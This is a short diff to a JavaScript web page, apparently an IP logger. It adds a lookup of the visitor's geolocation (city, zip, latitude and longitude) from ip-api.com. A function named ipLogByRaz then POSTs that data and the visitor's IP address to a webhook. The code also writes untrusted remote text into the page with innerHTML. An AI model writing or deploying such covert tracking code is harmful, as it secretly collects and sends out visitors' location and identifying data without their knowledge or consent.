@@ -41,6 +41,13 @@
         const secondList = document.getElementsByClassName("header")[0]
         secondList.appendChild(div)
       });
+      get_information("http://ip-api.com/json/?fields=continent,country,region,regionName,city,district,zip,lat,lon,timezone", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "log";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
       get_information("https://api.ipify.org/", function(text) {
         var div = document.createElement("div");
         div.innerHTML = text;
@@ -51,7 +58,7 @@
 
       function ipLogByRaz() {
         var ispp = document.getElementById('ipppp').innerHTML
-        var extra = document.getElementById("razzylog").innerHTML
+        var extra = document.getElementById("log").innerHTML
         const request = new XMLHttpRequest();
         request.open("POST", wbhk);
         request.setRequestHeader('Content-type', 'application/json');
